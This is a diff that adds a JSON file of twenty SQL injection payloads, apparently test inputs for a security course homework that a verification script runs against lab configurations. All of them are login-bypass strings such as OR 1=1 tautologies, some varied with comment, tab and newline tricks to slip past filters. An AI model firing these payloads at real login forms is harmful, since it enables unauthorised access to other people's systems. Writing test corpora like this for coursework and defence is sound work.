@@ -1,0 +1,26 @@
+{
+  "_comment": "Supplementary HW2 coverage inputs reused from Mauricio Mantilla's Week 7 extended SQLi corpus. Only the payload strings are reused; verify_readiness.py executes them again against the HW2 configurations and records new evidence. Previous studio results are not imported as HW2 results.",
+  "source": "studios/week-07/results/extended-sqli.csv (payload column)",
+  "payloads": [
+    "admin' OR 1=1--",
+    "admin' OR 2 = 2--",
+    "x' oR 7=7--",
+    "x' OR 42 = 42--",
+    "admin' OR 'a'='a'--",
+    "x' OR 'b'='b'--",
+    "x' OR '1'='1'--",
+    "x' OR 'cat'='cat'--",
+    "admin' OR TRUE--",
+    "x' OR true--",
+    "x' OR NOT FALSE--",
+    "x' OR (1)--",
+    "x' OR (1=1)--",
+    "x' OR/**/1=1--",
+    "x' OR\t1=1--",
+    "x' OR\n1=1--",
+    "x' OR 1<>0--",
+    "x' OR 2>1--",
+    "x' OR 'a' IN ('a')--",
+    "x' OR EXISTS(SELECT 1)--"
+  ]
+}
